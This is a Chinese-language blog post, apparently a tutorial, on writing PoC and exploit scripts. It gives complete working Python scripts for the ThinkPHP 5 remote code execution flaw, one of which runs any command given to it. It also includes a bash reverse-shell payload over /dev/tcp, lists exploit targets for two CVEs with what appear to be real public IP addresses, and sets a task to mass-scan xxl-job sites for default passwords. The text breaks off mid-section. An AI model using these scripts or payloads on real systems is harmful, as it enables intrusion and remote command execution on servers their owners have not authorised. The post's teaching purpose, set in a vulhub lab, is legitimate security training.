@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>poc和exp的编写 | pontus `Blog</title><meta name="author" content="pontus"><meta name="copyright" content="pontus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.poc和exp的区别poc  漏洞验证  exp  漏洞利用  他们两个的本质区别是使用的 payload 不同 , 比如我一个远程命令执行的漏洞 , 当我的payload是 id&#x2F;whoami这样的命令时 , 那么我整个脚本或者工具 , 就是poc , 因为我只是让他执行一下简单的系统命令来判断目标是否存在这样的漏洞 , 如果我的payload是一串 反弹shell的系统命令  如">
+<meta property="og:type" content="article">
+<meta property="og:title" content="poc和exp的编写">
+<meta property="og:url" content="https://pontusec.github.io/2023/04/02/poc&exp%E7%BC%96%E5%86%99/index.html">
+<meta property="og:site_name" content="pontus &#96;Blog">
+<meta property="og:description" content="1.poc和exp的区别poc  漏洞验证  exp  漏洞利用  他们两个的本质区别是使用的 payload 不同 , 比如我一个远程命令执行的漏洞 , 当我的payload是 id&#x2F;whoami这样的命令时 , 那么我整个脚本或者工具 , 就是poc , 因为我只是让他执行一下简单的系统命令来判断目标是否存在这样的漏洞 , 如果我的payload是一串 反弹shell的系统命令  如">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-04-02T09:19:23.179Z">
+<meta property="article:modified_time" content="2023-04-02T09:22:43.328Z">
+<meta property="article:author" content="pontus">
+<meta property="article:tag" content="博客，pontus，python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pontusec.github.io/2023/04/02/poc&amp;exp%E7%BC%96%E5%86%99/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'poc和exp的编写',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-02 17:22:43'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="pontus `Blog"><span class="site-name">pontus `Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">poc和exp的编写</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-02T09:19:23.179Z" title="发表于 2023-04-02 17:19:23">2023-04-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-02T09:22:43.328Z" title="更新于 2023-04-02 17:22:43">2023-04-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="poc和exp的编写"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-poc和exp的区别"><a href="#1-poc和exp的区别" class="headerlink" title="1.poc和exp的区别"></a>1.poc和exp的区别</h2><p>poc</p>
+<ul>
+<li>漏洞验证</li>
+</ul>
+<p>exp</p>
+<ul>
+<li>漏洞利用</li>
+</ul>
+<p>他们两个的本质区别是使用的 <strong><code>payload</code></strong> 不同 , 比如我一个远程命令执行的漏洞 , 当我的payload是 id&#x2F;whoami这样的命令时 , 那么我整个脚本或者工具 , 就是poc , 因为我只是让他执行一下简单的系统命令来判断目标是否存在这样的漏洞 , 如果我的payload是一串 反弹shell的系统命令 </p>
+<p>如 <code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.101.48/5656 0&gt;&amp;1</code> , 那么我整个工具就是一个exp , 可能这个poc和exp其他的代码都一模一样 , 只有要执行的命令 , 也就是这个命令 , 即 payload 不同 , 决定了这个脚本是poc还是exp</p>
+<h2 id="2-编写thinkphp5-rce的poc"><a href="#2-编写thinkphp5-rce的poc" class="headerlink" title="2.编写thinkphp5 rce的poc"></a>2.编写thinkphp5 rce的poc</h2><p>环境自己使用vulhub搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/thinkphp/5.0.23-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>使用 argparse 模块接收用户参数 , 加上banner信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, func=<span class="string">&quot;phpinfo&quot;</span></span>):</span><br><span class="line">    <span class="comment"># 1.发请求</span></span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/index.php?s=captcha&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080/index.php?s=captcha&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,ja;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;func&#125;</span>&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">&quot;-1&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(full_url, headers=headers, data=data,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 请求失败&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 2.判断是否存在漏洞</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;PHP Extension Build&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span> 存在远程代码执行漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 不存在远程代码执行漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string"> _   _     _       _          _          ____                 </span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ </span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / &#x27;_ \| &#x27;_ \| &#x27;_ \___ \  | &#x27;__/ __/ _ \\</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt;| |_) | | | | |_) |__) | | | | (_|  __/</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|</span></span><br><span class="line"><span class="string">                       |_|         |_|  </span></span><br><span class="line"><span class="string">                                                version: 0.0.1</span></span><br><span class="line"><span class="string">                                                author:   mhx</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="comment"># 使用argparse去解析命令行传来的参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;thinkphp5 rce poc&quot;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">        python3 tp5poc.py -u http://192.168.1.108</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    <span class="comment"># 添加参数</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>)</span><br><span class="line">    <span class="comment"># 把参数的值解析到对象中</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args.url)</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-编写thinkphp5-rce的exp"><a href="#3-编写thinkphp5-rce的exp" class="headerlink" title="3.编写thinkphp5 rce的exp"></a>3.编写thinkphp5 rce的exp</h2><p>使用 argparse 模块接收用户参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> textwrap</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">requests.packages.urllib3.disable_warnings()   <span class="comment">#屏蔽警告的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    <span class="comment"># 1.发请求</span></span><br><span class="line">    full_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/index.php?s=captcha&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://192.168.0.60:8080/index.php?s=captcha&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,ja;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    data1 = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">&quot;-1&quot;</span>&#125;</span><br><span class="line">    data2 = &#123;<span class="string">&quot;_method&quot;</span>: <span class="string">&quot;__construct&quot;</span>, <span class="string">&quot;filter[]&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;get&quot;</span>, <span class="string">&quot;server[REQUEST_METHOD]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;cmd&#125;</span>&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response1 = requests.post(full_url, headers=headers, data=data1,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        response2 = requests.post(full_url, headers=headers, data=data2,verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 请求失败&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 2.判断是否存在漏洞</span></span><br><span class="line">    <span class="keyword">if</span> response1.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;PHP Extension Build&quot;</span> <span class="keyword">in</span> response1.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span> 存在远程代码执行漏洞&quot;</span>)</span><br><span class="line">        <span class="comment"># 3.回显命令执行的结果给用户</span></span><br><span class="line">        res = response2.text.split(<span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span>,<span class="number">1</span>)[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;cmd&#125;</span>命令执行的回显为:\n<span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span> 不存在远程代码执行漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string"> _   _     _       _          _          ____                 </span></span><br><span class="line"><span class="string">| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ </span></span><br><span class="line"><span class="string">| __| &#x27;_ \| | &#x27;_ \| |/ / &#x27;_ \| &#x27;_ \| &#x27;_ \___ \  | &#x27;__/ __/ _ \\</span></span><br><span class="line"><span class="string">| |_| | | | | | | |   &lt;| |_) | | | | |_) |__) | | | | (_|  __/</span></span><br><span class="line"><span class="string"> \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|</span></span><br><span class="line"><span class="string">                       |_|         |_|  </span></span><br><span class="line"><span class="string">                                                version: 0.0.1</span></span><br><span class="line"><span class="string">                                                author:   mhx</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="comment"># 使用argparse去解析命令行传来的参数</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;thinkphp5 rce exp&quot;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">                                     epilog=textwrap.dedent(<span class="string">&#x27;&#x27;&#x27;example:</span></span><br><span class="line"><span class="string">        python3 tp5exp.py -u http://192.168.1.108 -c whoami</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>))</span><br><span class="line">    <span class="comment"># 添加参数</span></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a url&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, dest=<span class="string">&quot;cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;input a cmd&quot;</span>,default=<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="comment"># 把参数的值解析到对象中</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    main(args.url,args.cmd)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-编写以下漏洞exp"><a href="#4-编写以下漏洞exp" class="headerlink" title="4.编写以下漏洞exp"></a>4.编写以下漏洞exp</h2><p>使用 argparse 模块接收用户参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CVE-2022-26134      ATLASSIAN-Confluence   rce</span><br><span class="line">app=&quot;ATLASSIAN-Confluence&quot;</span><br><span class="line">https://www.exploit-db.com/exploits/50952</span><br><span class="line">https://106.52.3.78 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CVE-2021-46422    韩国的无线路由器 os cmd 注入</span><br><span class="line">app=&quot;SDT-CW3B1&quot;</span><br><span class="line">https://www.exploit-db.com/exploits/50948</span><br><span class="line">http://180.71.225.17:8083</span><br><span class="line"> http://42.29.2.54:8081</span><br><span class="line"> </span><br><span class="line"> （有坑）</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-编写弱口令检测脚本"><a href="#5-编写弱口令检测脚本" class="headerlink" title="5.编写弱口令检测脚本"></a>5.编写弱口令检测脚本</h2><p>写一个批量检测xxl-job存在默认账号和密码的python脚本 , 自己使用fofa语句把url保存到一个url.txt中 , 并将检测结果打印到终端 , 打印格式 , 使用前面的命令行编程</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">打印格式</span><br><span class="line">[+]http://xxx.com 存在默认口令 admin:123456    # 字符串格式化</span><br><span class="line">[-]http://xxx.com 不存在默认口令</span><br><span class="line"></span><br><span class="line">（有坑）</span><br><span class="line">try:请求可能会出错 ，出错则打印请求失败</span><br><span class="line">报错那：不要程序退出 ，要函数退出,suo&#x27;j</span><br><span class="line">频繁的操作文件，效率低，所以追加到列表 ，统一写入文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>fofa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;xxl-job&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后将存在默认口令的站点url保存在result.txt 文本 , 每一条一行   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">保存格式:</span><br><span class="line">http://xxx.com </span><br><span class="line">http://xxx.com </span><br></pre></td></tr></table></figure>
+
+<h2 id="6-编写个人poc流程思路"><a href="#6-编写个人poc流程思路" class="headerlink" title="6.编写个人poc流程思路"></a>6.编写个人poc流程思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求模版----try---判断漏洞是否存在---main封装函数模板----打印banner----使用 argparse 模块接收用户参数----------写描述并打印示例(import textwrap)-------添加参数和参数属性</span><br></pre></td></tr></table></figure>
+
+<p>注意事项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try 这里一定要看好 是  get请求  还是post请求     并且删除多余的那一行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如何取得判断是否有漏洞的依据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有漏洞的包和无漏洞的包都发送到对比器，进行对比</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如何取响应包的值？</p>
